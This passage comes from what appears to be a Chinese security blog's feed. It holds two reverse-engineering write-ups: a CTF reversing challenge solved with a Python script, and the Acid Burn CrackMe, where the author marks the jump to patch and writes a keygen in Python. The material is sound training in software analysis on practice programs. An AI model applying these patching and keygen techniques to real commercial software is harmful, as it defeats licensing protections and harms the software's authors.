判断不超过字符串长度则继续</div><div class="line"><span class="number">011B</span>57EB    <span class="number">7</span>D <span class="number">23</span>           jge <span class="keyword">short</span> reverse_<span class="number">.011B</span>5810</div><div class="line"><span class="number">011B</span>57ED    <span class="number">8B</span>85 <span class="number">54F</span>FFFFF   mov eax,dword ptr ss:[ebp<span class="number">-0xAC</span>]</div><div class="line"><span class="number">011B</span>57F3    <span class="number">0F</span>BE8C05 <span class="number">6</span>CFFFF&gt;movsx ecx,byte ptr ss:[ebp+eax<span class="number">-0x94</span>]     ; 每次取一位字符串的hex+eax</div><div class="line"><span class="number">011B</span>57FB    <span class="number">038</span>D <span class="number">54F</span>FFFFF   add ecx,dword ptr ss:[ebp<span class="number">-0xAC</span>]</div><div class="line"><span class="number">011B</span>5801    <span class="number">8B</span>95 <span class="number">54F</span>FFFFF   mov edx,dword ptr ss:[ebp<span class="number">-0xAC</span>]</div><div class="line"><span class="number">011B</span>5807    <span class="number">888</span>C15 <span class="number">6</span>CFFFFFF mov byte ptr ss:[ebp+edx<span class="number">-0x94</span>],cl        ; 重新赋值给 字符串[eax]</div><div class="line"><span class="number">011B</span>580E  ^ EB C0           jmp <span class="keyword">short</span> reverse_<span class="number">.011B</span>57D0</div><div class="line"><span class="number">011B</span>5810    <span class="number">8</span>D85 <span class="number">6</span>CFFFFFF   lea eax,dword ptr ss:[ebp<span class="number">-0x94</span>]</div><div class="line"><span class="number">011B</span>5816    <span class="number">50</span>              push eax</div></pre></td></tr></table></figure>
<p>最后在这里进行判断<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">011B</span>581C    <span class="number">83</span>C4 <span class="number">04</span>         add esp,<span class="number">0x4</span></div><div class="line"><span class="number">011B</span>581F    <span class="number">8B</span>F4            mov esi,esp</div><div class="line"><span class="number">011B</span>5821    <span class="number">50</span>              push eax</div><div class="line"><span class="number">011B</span>5822    <span class="number">68</span> <span class="number">34</span>A01B01     push reverse_<span class="number">.011B</span>A034                   ; e3nifIH9b_C@n@dH</div><div class="line"><span class="number">011B</span>5827    <span class="number">8</span>D8D <span class="number">6</span>CFFFFFF   lea ecx,dword ptr ss:[ebp<span class="number">-0x94</span>]</div><div class="line"><span class="number">011B</span>582D    <span class="number">51</span>              push ecx</div><div class="line"><span class="number">011B</span>582E    FF15 <span class="number">84B</span>11B01   call dword ptr ds:[&lt;&amp;ucrtbased.<span class="built_in">strncmp</span>&gt;] ; ucrtbase.<span class="built_in">strncmp</span></div><div class="line"><span class="number">011B</span>5834    <span class="number">83</span>C4 <span class="number">0</span>C         add esp,<span class="number">0xC</span></div><div class="line"><span class="number">011B</span>5837    <span class="number">3B</span>F4            cmp esi,esp</div></pre></td></tr></table></figure></p>
<p>关于strncmp的解释</p>
<blockquote>
<p>strncmp<br>int strncmp ( const char <em> str1, const char </em> str2, size_t n );<br>【参数】str1, str2 为需要比较的两个字符串，n为要比较的字符的数目。<br>【返回值】若str1与str2的前n个字符相同，则返回0；若s1大于s2，则返回大于0的值；若s1 若小于s2，则返回小于0的值。</p>
</blockquote>
<h2 id="爆破关键点"><a href="#爆破关键点" class="headerlink" title="爆破关键点"></a>爆破关键点</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">011B</span>5837    <span class="number">3B</span>F4            cmp esi,esp</div><div class="line"><span class="number">011B</span>5839    E8 E9B8FFFF     call reverse_<span class="number">.011B</span>1127</div><div class="line"><span class="number">011B</span>583E    <span class="number">85</span>C0            test eax,eax</div><div class="line"><span class="number">011B</span>5840    <span class="number">74</span> <span class="number">0F</span>           je <span class="keyword">short</span> reverse_<span class="number">.011B</span>5851               ; <span class="comment">//爆破关键点</span></div><div class="line"><span class="number">011B</span>5842    <span class="number">68</span> <span class="number">947B</span>1B01     push reverse_<span class="number">.011B</span>7B94                   ; wrong flag!\n</div><div class="line"><span class="number">011B</span>5847    E8 E3BAFFFF     call reverse_<span class="number">.011B</span>132F</div><div class="line"><span class="number">011B</span>584C    <span class="number">83</span>C4 <span class="number">04</span>         add esp,<span class="number">0x4</span></div><div class="line"><span class="number">011B</span>584F    EB <span class="number">0</span>D           jmp <span class="keyword">short</span> reverse_<span class="number">.011B</span>585E</div><div class="line"><span class="number">011B</span>5851    <span class="number">68</span> <span class="number">4</span>C7C1B01     push reverse_<span class="number">.011B</span>7C4C                   ; rigth flag!\n</div><div class="line"><span class="number">011B</span>5856    E8 D4BAFFFF     call reverse_<span class="number">.011B</span>132F</div><div class="line"><span class="number">011B</span>585B    <span class="number">83</span>C4 <span class="number">04</span>         add esp,<span class="number">0x4</span></div></pre></td></tr></table></figure>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><p>从上面的分析得出，该题通俗点说就是把输入的字符串进行 Base64编码，根据编码后的长度对编码后的字符串进行逐位加增加。<br>增加规则为 第0位+0x00  第1位+0x01 ….. 第N位+0x0N<br>最后对比的字符串为</p>
<blockquote>
<p>e3nifIH9b_C@n@dH</p>
</blockquote>
<p>python代码<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> binascii,base64</div><div class="line"></div><div class="line">strA = <span class="string">'e3nifIH9b_C@n@dH'</span></div><div class="line">strB = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">0</span>,len(strA)):</div><div class="line">	strB = strB + chr(int(binascii.b2a_hex(strA[num]),<span class="number">16</span>) - num)</div><div class="line"><span class="keyword">print</span> base64.b64decode(strB)</div></pre></td></tr></table></figure></p>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/images/jt/6671501-0bdd9658c4eb606f.png" alt=""></p>
<p>flag是：</p>
<blockquote>
<p>{i_l0ve_you}</p>
</blockquote>
<h2 id="测试是否正确"><a href="#测试是否正确" class="headerlink" title="测试是否正确"></a>测试是否正确</h2><p><img src="/images/jt/6671501-63afa9d77b031c99.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>加密后的flag不是很长，有耐心的同学直接用calc计算也可以争取的结果，flag是表白么？如果做题的是妹子感觉也是很不错的。PS:别做梦了，妹子会玩windows逆向么？/滑稽脸</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>CrackMe</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>【CrackMe】Acid burn追码写注册机</title>
    <url>/2017/07/07/%E3%80%90CrackMe%E3%80%91Acid%20burn%E8%BF%BD%E7%A0%81%E5%86%99%E6%B3%A8%E5%86%8C%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>暴力破解虽然很爽，但追码写注册机才是技术活，在吾爱找到一个CrackMe集合，有160个，打算慢慢研究慢慢写，如果我都能解出来的话。</p>
<blockquote>
<p>程序下载地址：<a href="http://download.csdn.net/detail/dad9988/9891206" target="_blank" rel="external">http://download.csdn.net/detail/dad9988/9891206</a><br>难度：★<br>使用工具：ollydbg吾爱破解专版<br>运行环境：windows 7 x64</p>
</blockquote>
<a id="more"></a>
<h1 id="程序截图"><a href="#程序截图" class="headerlink" title="程序截图"></a>程序截图</h1><p>这个集合第一个作者是Acid burn<br><img src="/images/jt/6671501-7d754855a4be1d3a.png" alt=""></p>
<h2 id="正确提示"><a href="#正确提示" class="headerlink" title="正确提示"></a>正确提示</h2><p><img src="/images/jt/6671501-5e70f98815c3b824.png" alt=""></p>
<h2 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h2><p><img src="/images/jt/6671501-f1d889f3396232c9.png" alt=""></p>
<h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><p>需要输入username与key，程序会根据username计算key，符合规则则弹出正确提示。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>从截图很容易看出来这个CrackMe是利用消息框反馈结果，直接下消息框断点，返回程序领空。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">0042F</span>998  /.  <span class="number">55</span>            push ebp</div><div class="line"><span class="number">0042F</span>999  |.  <span class="number">8B</span>EC          mov ebp,esp</div><div class="line"><span class="number">0042F</span>99B  |.  <span class="number">33</span>C9          xor ecx,ecx</div><div class="line"><span class="number">0042F</span>99D  |.  <span class="number">51</span>            push ecx</div><div class="line"><span class="number">0042F</span>99E  |.  <span class="number">51</span>            push ecx</div></pre></td></tr></table></figure>
<p><img src="/images/jt/6671501-f14d717135338c76.png" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">0042F</span>9C8  |.  E8 <span class="number">8B</span>B0FEFF   call Acid_bur<span class="number">.0041</span>AA58                  ;  得到输入的username</div><div class="line"><span class="number">0042F</span>9CD  |.  <span class="number">8B</span>45 F0       mov eax,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>9D0  |.  E8 DB40FDFF   call Acid_bur<span class="number">.00403</span>AB0</div><div class="line"><span class="number">0042F</span>9D5  |.  A3 <span class="number">6</span>C174300   mov dword ptr ds:[<span class="number">0x43176C</span>],eax         ;  username存入<span class="number">0x43176c</span></div><div class="line"><span class="number">0042F</span>9DA  |.  <span class="number">8</span>D55 F0       lea edx,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>9DD  |.  <span class="number">8B</span>83 DC010000 mov eax,dword ptr ds:[ebx+<span class="number">0x1DC</span>]</div><div class="line"><span class="number">0042F</span>9E3  |.  E8 <span class="number">70B</span>0FEFF   call Acid_bur<span class="number">.0041</span>AA58</div><div class="line"><span class="number">0042F</span>9E8  |.  <span class="number">8B</span>45 F0       mov eax,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>9EB  |.  <span class="number">0F</span>B600        movzx eax,byte ptr ds:[eax]             ;  取第一位</div><div class="line"><span class="number">0042F</span>9EE  |.  <span class="number">8B</span>F0          mov esi,eax</div><div class="line"><span class="number">0042F</span>9F0  |.  C1E6 <span class="number">03</span>       shl esi,<span class="number">0x3</span>                             ;  esi左移三位 esi=<span class="number">188</span></div><div class="line"><span class="number">0042F</span>9F3  |.  <span class="number">2B</span>F0          sub esi,eax                             ;  eax=esi-eax</div><div class="line"><span class="number">0042F</span>9F5  |.  <span class="number">8</span>D55 EC       lea edx,[local<span class="number">.5</span>]</div><div class="line"><span class="number">0042F</span>9F8  |.  <span class="number">8B</span>83 DC010000 mov eax,dword ptr ds:[ebx+<span class="number">0x1DC</span>]</div><div class="line"><span class="number">0042F</span>9FE  |.  E8 <span class="number">55B</span>0FEFF   call Acid_bur<span class="number">.0041</span>AA58</div><div class="line"><span class="number">0042F</span>A03  |.  <span class="number">8B</span>45 EC       mov eax,[local<span class="number">.5</span>]</div><div class="line"><span class="number">0042F</span>A06  |.  <span class="number">0F</span>B640 <span class="number">01</span>     movzx eax,byte ptr ds:[eax+<span class="number">0x1</span>]         ;  取第二位</div><div class="line"><span class="number">0042F</span>A0A  |.  C1E0 <span class="number">04</span>       shl eax,<span class="number">0x4</span>                             ;  eax左移四位</div><div class="line"><span class="number">0042F</span>A0D  |.  <span class="number">03F</span>0          add esi,eax                             ;  加上上次运算的结果</div><div class="line"><span class="number">0042F</span>A0F      <span class="number">8935</span> <span class="number">54174300</span> mov dword ptr ds:[<span class="number">0x431754</span>],esi         ;  存放到 <span class="number">0x431754</span></div><div class="line"><span class="number">0042F</span>A15  |.  <span class="number">8</span>D55 F0       lea edx,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>A18  |.  <span class="number">8B</span>83 DC010000 mov eax,dword ptr ds:[ebx+<span class="number">0x1DC</span>]</div><div class="line"><span class="number">0042F</span>A1E  |.  E8 <span class="number">35B</span>0FEFF   call Acid_bur<span class="number">.0041</span>AA58</div><div class="line"><span class="number">0042F</span>A23  |.  <span class="number">8B</span>45 F0       mov eax,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>A26  |.  <span class="number">0F</span>B640 <span class="number">03</span>     movzx eax,byte ptr ds:[eax+<span class="number">0x3</span>]         ;  取第四位</div><div class="line"><span class="number">0042F</span>A2A  |.  <span class="number">6B</span>F0 <span class="number">0B</span>       imul esi,eax,<span class="number">0xB</span>                        ;  esi=eax*<span class="number">0xB</span></div><div class="line"><span class="number">0042F</span>A2D  |.  <span class="number">8</span>D55 EC       lea edx,[local<span class="number">.5</span>]</div><div class="line"><span class="number">0042F</span>A30  |.  <span class="number">8B</span>83 DC010000 mov eax,dword ptr ds:[ebx+<span class="number">0x1DC</span>]</div><div class="line"><span class="number">0042F</span>A36  |.  E8 <span class="number">1</span>DB0FEFF   call Acid_bur<span class="number">.0041</span>AA58</div><div class="line"><span class="number">0042F</span>A3B  |.  <span class="number">8B</span>45 EC       mov eax,[local<span class="number">.5</span>]</div><div class="line"><span class="number">0042F</span>A3E  |.  <span class="number">0F</span>B640 <span class="number">02</span>     movzx eax,byte ptr ds:[eax+<span class="number">0x2</span>]         ;  取第三位</div><div class="line"><span class="number">0042F</span>A42  |.  <span class="number">6B</span>C0 <span class="number">0</span>E       imul eax,eax,<span class="number">0xE</span>                        ;  eax=eax*<span class="number">0xE</span></div><div class="line"><span class="number">0042F</span>A45  |.  <span class="number">03F</span>0          add esi,eax                             ;  加上第四位运算结果</div><div class="line"><span class="number">0042F</span>A47  |.  <span class="number">8935</span> <span class="number">58174300</span> mov dword ptr ds:[<span class="number">0x431758</span>],esi         ;  存放到<span class="number">0x431758</span></div><div class="line"><span class="number">0042F</span>A4D  |.  A1 <span class="number">6</span>C174300   mov eax,dword ptr ds:[<span class="number">0x43176C</span>]</div><div class="line"><span class="number">0042F</span>A52  |.  E8 D96EFDFF   call Acid_bur<span class="number">.00406930</span></div><div class="line"><span class="number">0042F</span>A57  |.  <span class="number">83F</span>8 <span class="number">04</span>       cmp eax,<span class="number">0x4</span>                             ;  <span class="comment">//判断输入的用户名小于4位则提示错误---------</span></div><div class="line"><span class="number">0042F</span>A5A  |.  <span class="number">7</span>D <span class="number">1</span>D         jge <span class="keyword">short</span> Acid_bur<span class="number">.0042F</span>A79</div><div class="line"><span class="number">0042F</span>A5C  |.  <span class="number">6</span>A <span class="number">00</span>         push <span class="number">0x0</span></div><div class="line"><span class="number">0042F</span>A5E  |.  B9 <span class="number">74F</span>B4200   mov ecx,Acid_bur<span class="number">.0042F</span>B74               ;  Try Again!</div><div class="line"><span class="number">0042F</span>A63  |.  BA <span class="number">80F</span>B4200   mov edx,Acid_bur<span class="number">.0042F</span>B80               ;  Sorry , The serial is incorect !</div><div class="line"><span class="number">0042F</span>A68  |.  A1 <span class="number">480</span>A4300   mov eax,dword ptr ds:[<span class="number">0x430A48</span>]</div><div class="line"><span class="number">0042F</span>A6D  |.  <span class="number">8B</span>00          mov eax,dword ptr ds:[eax]</div><div class="line"><span class="number">0042F</span>A6F  |.  E8 FCA6FFFF   call Acid_bur<span class="number">.0042</span>A170</div></pre></td></tr></table></figure>
<p>刚开始我认识这段程序反复取值进行运算，并存放起来，在后面肯定会用到，结果发现他最后只是进行一个长度是否为4位的判断，之后的运算也并没有用到这里的计算结果，很坑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">0042F</span>A87  |.  <span class="number">8B</span>45 F0       mov eax,[local<span class="number">.4</span>]                       ;  输入的内容存入EAX</div><div class="line"><span class="number">0042F</span>A8A  |.  <span class="number">0F</span>B600        movzx eax,byte ptr ds:[eax]             ;  取第一位存入EAX</div><div class="line"><span class="number">0042F</span>A8D  |.  F72D <span class="number">50174300</span> imul dword ptr ds:[<span class="number">0x431750</span>]</div><div class="line"><span class="number">0042F</span>A93  |.  A3 <span class="number">50174300</span>   mov dword ptr ds:[<span class="number">0x431750</span>],eax</div><div class="line"><span class="number">0042F</span>A98  |.  A1 <span class="number">50174300</span>   mov eax,dword ptr ds:[<span class="number">0x431750</span>]</div><div class="line"><span class="number">0042F</span>A9D  |.  <span class="number">0105</span> <span class="number">50174300</span> add dword ptr ds:[<span class="number">0x431750</span>],eax         ;  [<span class="number">0x431750</span>]=EAX*[<span class="number">0x431750</span>]*<span class="number">2</span></div><div class="line"><span class="number">0042F</span>AA3  |.  <span class="number">8</span>D45 FC       lea eax,[local<span class="number">.1</span>]</div><div class="line"><span class="number">0042F</span>AA6  |.  BA ACFB4200   mov edx,Acid_bur<span class="number">.0042F</span>BAC               ;  CW</div><div class="line"><span class="number">0042F</span>AAB  |.  E8 <span class="number">583</span>CFDFF   call Acid_bur<span class="number">.00403708</span></div><div class="line"><span class="number">0042F</span>AB0  |.  <span class="number">8</span>D45 F8       lea eax,[local<span class="number">.2</span>]</div><div class="line"><span class="number">0042F</span>AB3  |.  BA B8FB4200   mov edx,Acid_bur<span class="number">.0042F</span>BB8               ;  CRACK</div><div class="line"><span class="number">0042F</span>AB8  |.  E8 <span class="number">4B</span>3CFDFF   call Acid_bur<span class="number">.00403708</span></div><div class="line"><span class="number">0042F</span>ABD  |.  FF75 FC       push [local<span class="number">.1</span>]</div><div class="line"><span class="number">0042F</span>AC0  |.  <span class="number">68</span> C8FB4200   push Acid_bur<span class="number">.0042F</span>BC8                  ;  -</div><div class="line"><span class="number">0042F</span>AC5  |.  <span class="number">8</span>D55 E8       lea edx,[local<span class="number">.6</span>]</div><div class="line"><span class="number">0042F</span>AC8  |.  A1 <span class="number">50174300</span>   mov eax,dword ptr ds:[<span class="number">0x431750</span>]</div><div class="line"><span class="number">0042F</span>ACD  |.  E8 <span class="number">466</span>CFDFF   call Acid_bur<span class="number">.00406718</span>                  ;  <span class="comment">////////////////////某种计算规则</span></div><div class="line"><span class="number">0042F</span>AD2  |.  FF75 E8       push [local<span class="number">.6</span>]</div><div class="line"><span class="number">0042F</span>AD5  |.  <span class="number">68</span> C8FB4200   push Acid_bur<span class="number">.0042F</span>BC8                  ;  -</div><div class="line"><span class="number">0042F</span>ADA  |.  FF75 F8       push [local<span class="number">.2</span>]                          ;  msctf<span class="number">.752379E5</span></div></pre></td></tr></table></figure>
<p>[0x431750]=EAX<em>[0x431750]</em>2<br>0x431750在程序开头会直接赋值0x29</p>
<blockquote>
<p>mov dword ptr ds:[0x431750],0x29</p>
</blockquote>
<p>最后一段，关键点在于某种算法规则这里。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">0042F</span>ACD  |.  E8 <span class="number">466</span>CFDFF   call Acid_bur<span class="number">.00406718</span>                  ;  <span class="comment">////////////////////某种计算规则</span></div><div class="line"><span class="number">0042F</span>AD2  |.  FF75 E8       push [local<span class="number">.6</span>]</div><div class="line"><span class="number">0042F</span>AD5  |.  <span class="number">68</span> C8FB4200   push Acid_bur<span class="number">.0042F</span>BC8                  ;  -</div><div class="line"><span class="number">0042F</span>ADA  |.  FF75 F8       push [local<span class="number">.2</span>]</div><div class="line"><span class="number">0042F</span>ADD  |.  <span class="number">8</span>D45 F4       lea eax,[local<span class="number">.3</span>]</div><div class="line"><span class="number">0042F</span>AE0  |.  BA <span class="number">05000000</span>   mov edx,<span class="number">0x5</span></div><div class="line"><span class="number">0042F</span>AE5  |.  E8 C23EFDFF   call Acid_bur<span class="number">.004039</span>AC</div><div class="line"><span class="number">0042F</span>AEA  |.  <span class="number">8</span>D55 F0       lea edx,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>AED  |.  <span class="number">8B</span>83 E0010000 mov eax,dword ptr ds:[ebx+<span class="number">0x1E0</span>]</div><div class="line"><span class="number">0042F</span>AF3  |.  E8 <span class="number">60</span>AFFEFF   call Acid_bur<span class="number">.0041</span>AA58</div><div class="line"><span class="number">0042F</span>AF8  |.  <span class="number">8B</span>55 F0       mov edx,[local<span class="number">.4</span>]</div><div class="line"><span class="number">0042F</span>AFB  |.  <span class="number">8B</span>45 F4       mov eax,[local<span class="number">.3</span>]</div><div class="line"><span class="number">0042F</span>AFE  |.  E8 F93EFDFF   call Acid_bur<span class="number">.004039F</span>C</div><div class="line"><span class="number">0042F</span>B03  |.  <span class="number">75</span> <span class="number">1</span>A         jnz <span class="keyword">short</span> Acid_bur<span class="number">.0042F</span>B1F</div><div class="line"><span class="number">0042F</span>B05  |.  <span class="number">6</span>A <span class="number">00</span>         push <span class="number">0x0</span></div><div class="line"><span class="number">0042F</span>B07  |.  B9 CCFB4200   mov ecx,Acid_bur<span class="number">.0042F</span>BCC               ;  Congratz !!</div><div class="line"><span class="number">0042F</span>B0C  |.  BA D8FB4200   mov edx,Acid_bur<span class="number">.0042F</span>BD8               ;  Good job dude =)</div><div class="line"><span class="number">0042F</span>B11  |.  A1 <span class="number">480</span>A4300   mov eax,dword ptr ds:[<span class="number">0x430A48</span>]</div><div class="line"><span class="number">0042F</span>B16  |.  <span class="number">8B</span>00          mov eax,dword ptr ds:[eax]</div><div class="line"><span class="number">0042F</span>B18  |.  E8 <span class="number">53</span>A6FFFF   call Acid_bur<span class="number">.0042</span>A170</div><div class="line"><span class="number">0042F</span>B1D  |.  EB <span class="number">18</span>         jmp <span class="keyword">short</span> Acid_bur<span class="number">.0042F</span>B37</div><div class="line"><span class="number">0042F</span>B1F  |&gt;  <span class="number">6</span>A <span class="number">00</span>         push <span class="number">0x0</span></div><div class="line"><span class="number">0042F</span>B21  |.  B9 <span class="number">74F</span>B4200   mov ecx,Acid_bur<span class="number">.0042F</span>B74               ;  Try Again!</div><div class="line"><span class="number">0042F</span>B26  |.  BA <span class="number">80F</span>B4200   mov edx,Acid_bur<span class="number">.0042F</span>B80               ;  Sorry , The serial is incorect !</div><div class="line"><span class="number">0042F</span>B2B  |.  A1 <span class="number">480</span>A4300   mov eax,dword ptr ds:[<span class="number">0x430A48</span>]</div><div class="line"><span class="number">0042F</span>B30  |.  <span class="number">8B</span>00          mov eax,dword ptr ds:[eax]</div><div class="line"><span class="number">0042F</span>B32  |.  E8 <span class="number">39</span>A6FFFF   call Acid_bur<span class="number">.0042</span>A170</div></pre></td></tr></table></figure></p>
<blockquote>
<p>0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC</p>
</blockquote>
<p>这里为最终判断call，会比对生成的key与我输入的key，进行判断，暴力破解的话直接修改这里。</p>
<blockquote>
<p>0042FB03  |. /75 1A         jnz short Acid_bur.0042FB1F</p>
</blockquote>
<p>最终生成key算法。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">00406</span>DC2  |$  B9 <span class="number">0</span>A000000   mov ecx,<span class="number">0xA</span>                             ;  Case <span class="number">55</span> (<span class="string">'U'</span>) of <span class="keyword">switch</span> <span class="number">00406</span>D9A</div><div class="line"><span class="number">00406</span>DC7  |&gt;  <span class="number">8</span>D75 C4       lea esi,[local<span class="number">.15</span>]</div><div class="line"><span class="number">00406</span>DCA  |&gt;  <span class="number">31</span>D2          /xor edx,edx</div><div class="line"><span class="number">00406</span>DCC  |.  F7F1          |div ecx                                ;  计算循环----------</div><div class="line"><span class="number">00406</span>DCE  |.  <span class="number">80</span>C2 <span class="number">30</span>       |add dl,<span class="number">0x30</span></div><div class="line"><span class="number">00406</span>DD1  |.  <span class="number">80F</span>A <span class="number">3</span>A       |cmp dl,<span class="number">0x3A</span></div><div class="line"><span class="number">00406</span>DD4  |.  <span class="number">72</span> <span class="number">03</span>         |jb <span class="keyword">short</span> Acid_bur<span class="number">.00406</span>DD9</div><div class="line"><span class="number">00406</span>DD6  |.  <span class="number">80</span>C2 <span class="number">07</span>       |add dl,<span class="number">0x7</span></div><div class="line"><span class="number">00406</span>DD9  |&gt;  <span class="number">4</span>E            |dec esi</div><div class="line"><span class="number">00406</span>DDA  |.  <span class="number">8816</span>          |mov byte ptr ds:[esi],dl</div><div class="line"><span class="number">00406</span>DDC  |.  <span class="number">09</span>C0          |or eax,eax</div><div class="line"><span class="number">00406</span>DDE  |.^ <span class="number">75</span> EA         \jnz <span class="keyword">short</span> Acid_bur<span class="number">.00406</span>DCA</div><div class="line"><span class="number">00406</span>DE0  |.  <span class="number">8</span>D4D C4       lea ecx,[local<span class="number">.15</span>]</div><div class="line"><span class="number">00406</span>DE3  |.  <span class="number">29F</span>1          sub ecx,esi</div><div class="line"><span class="number">00406</span>DE5  |.  <span class="number">8B</span>55 E0       mov edx,[local<span class="number">.8</span>]</div><div class="line"><span class="number">00406</span>DE8  |.  <span class="number">83F</span>A <span class="number">10</span>       cmp edx,<span class="number">0x10</span></div><div class="line"><span class="number">00406</span>DEB  |.  <span class="number">72</span> <span class="number">01</span>         jb <span class="keyword">short</span> Acid_bur<span class="number">.00406</span>DEE</div><div class="line"><span class="number">00406</span>DED  |.  C3            retn</div></pre></td></tr></table></figure></p>
<p>xor edx,edx<br>div ecx  //这里与eax进行运算</p>
<p>eax取自<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">0042F</span>A87  |.  <span class="number">8B</span>45 F0       mov eax,[local<span class="number">.4</span>]                        ;  输入的内容存入EAX</div><div class="line"><span class="number">0042F</span>A8A  |.  <span class="number">0F</span>B600        movzx eax,byte ptr ds:[eax]              ;  取第一位存入EAX</div><div class="line"><span class="number">0042F</span>A8D  |.  F72D <span class="number">50174300</span> imul dword ptr ds:[<span class="number">0x431750</span>]</div><div class="line"><span class="number">0042F</span>A93  |.  A3 <span class="number">50174300</span>   mov dword ptr ds:[<span class="number">0x431750</span>],eax</div><div class="line"><span class="number">0042F</span>A98  |.  A1 <span class="number">50174300</span>   mov eax,dword ptr ds:[<span class="number">0x431750</span>]</div><div class="line"><span class="number">0042F</span>A9D  |.  <span class="number">0105</span> <span class="number">50174300</span> add dword ptr ds:[<span class="number">0x431750</span>],eax          ;  [<span class="number">0x431750</span>]=EAX*[<span class="number">0x431750</span>]*<span class="number">2</span></div><div class="line"><span class="number">0042F</span>AA3  |.  <span class="number">8</span>D45 FC       lea eax,[local<span class="number">.1</span>]</div></pre></td></tr></table></figure></p>
<p>根据算法写python脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">strUserName = raw_input(<span class="string">"userNaem: "</span>)</div><div class="line">a = int(binascii.b2a_hex(strUserName[<span class="number">0</span>]),<span class="number">16</span>) * int(<span class="string">'0x29'</span>,<span class="number">16</span>) * <span class="number">2</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> str(hex(a))</div><div class="line"></div><div class="line">strA = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">	b = a % <span class="number">10</span></div><div class="line">	a = a / <span class="number">10</span></div><div class="line">	strA = str(b) + strA</div><div class="line"><span class="keyword">print</span> <span class="string">'CW-'</span> + str(strA) + <span class="string">'-CRACKED'</span></div></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>细心的人其实已经看出来了，<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">b = a % <span class="number">10</span></div><div class="line">a = a / <span class="number">10</span></div><div class="line">strA = str(b) + strA</div></pre></td></tr></table></figure></p>
<p>这不就是他本身么，OD跟踪的时候是十六进制，最后进入一个call，这个call的作用就是进制转换。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="number">00406</span>DCA  |&gt; /<span class="number">31</span>D2          /xor edx,edx</div><div class="line"><span class="number">00406</span>DCC  |. |F7F1          |div ecx                                 ;  计算循环----------</div><div class="line"><span class="number">00406</span>DCE  |. |<span class="number">80</span>C2 <span class="number">30</span>       |add dl,<span class="number">0x30</span></div><div class="line"><span class="number">00406</span>DD1  |. |<span class="number">80F</span>A <span class="number">3</span>A       |cmp dl,<span class="number">0x3A</span></div><div class="line"><span class="number">00406</span>DD4  |. |<span class="number">72</span> <span class="number">03</span>         |jb <span class="keyword">short</span> Acid_bur<span class="number">.00406</span>DD9</div><div class="line"><span class="number">00406</span>DD6  |. |<span class="number">80</span>C2 <span class="number">07</span>       |add dl,<span class="number">0x7</span></div><div class="line"><span class="number">00406</span>DD9  |&gt; |<span class="number">4</span>E            |dec esi</div><div class="line"><span class="number">00406</span>DDA  |. |<span class="number">8816</span>          |mov byte ptr ds:[esi],dl</div><div class="line"><span class="number">00406</span>DDC  |. |<span class="number">09</span>C0          |or eax,eax</div><div class="line"><span class="number">00406</span>DDE  |.^\<span class="number">75</span> EA         \jnz <span class="keyword">short</span> Acid_bur<span class="number">.00406</span>DCA</div></pre></td></tr></table></figure></p>
<p>key计算可以优化一下<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">strUserName = raw_input(<span class="string">"userNaem:"</span>)</div><div class="line">a = int(binascii.b2a_hex(strUserName[<span class="number">0</span>]),<span class="number">16</span>) * int(<span class="string">'0x29'</span>,<span class="number">16</span>) * <span class="number">2</span></div><div class="line"><span class="keyword">print</span> <span class="string">'CW-'</span> + str(a) + <span class="string">'-CRACKED'</span></div></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>CrackMe</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio动态调试Smail</title>
    <url>/2017/07/03/Android-Studio%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Smail/</url>
